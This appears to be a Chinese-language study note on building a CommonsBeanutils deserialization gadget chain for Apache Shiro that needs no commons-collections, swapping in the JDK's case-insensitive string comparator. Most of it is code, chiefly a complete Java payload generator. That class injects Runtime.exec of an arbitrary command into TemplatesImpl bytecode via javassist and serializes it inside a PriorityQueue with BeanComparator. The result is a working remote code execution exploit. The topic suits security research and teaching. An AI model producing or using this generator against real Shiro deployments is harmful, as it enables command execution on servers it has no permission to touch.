# shiro2CB

不依赖commons-collections，尝试通过CommonsBeanutils来构造链子，首先要理解CommonsBeanutils链的基本原理


尝试写一个ysoserial中差不多的CB来打


原来CommonsBeanutils中原来用到的comparator是`ComparableComparator`

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220407011222-06x1cd0.png)

但是它在acc3.1里面

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220407011304-goakyf2.png)


所以使用替换Comparator：就是这个在java.lang下的类`CaseInsensitiveComparator`，如此一来就可以脱离shiro依赖了

```java
private static class CaseInsensitiveComparator
            implements Comparator<String>, java.io.Serializable {
        // use serialVersionUID from JDK 1.2.2 for interoperability
        private static final long serialVersionUID = 8575799808933029326L;

        public int compare(String s1, String s2) {
            int n1 = s1.length();
            int n2 = s2.length();
            int min = Math.min(n1, n2);
            for (int i = 0; i < min; i++) {
                char c1 = s1.charAt(i);
                char c2 = s2.charAt(i);
                if (c1 != c2) {
                    c1 = Character.toUpperCase(c1);
                    c2 = Character.toUpperCase(c2);
                    if (c1 != c2) {
                        c1 = Character.toLowerCase(c1);
                        c2 = Character.toLowerCase(c2);
                        if (c1 != c2) {
                            // No overflow because of numeric promotion
                            return c1 - c2;
                        }
                    }
                }
            }
            return n1 - n2;
        }
```


```java
package com.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

import static sun.reflect.misc.FieldUtil.getField;

public class CommonsBeanutilShiro {
    public  byte[] getPayload(String command) throws Exception {
        TemplatesImpl templatesImpl = createTemplatesImpl(command);

        final BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(beanComparator, "property", "outputProperties");

        setFieldValue(queue,"queue",new Object[]{templatesImpl,templatesImpl});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        //修改Neo类，插入command，创建恶意字节码，此处参考ysoserial
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.getCtClass(Neo.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }
}
```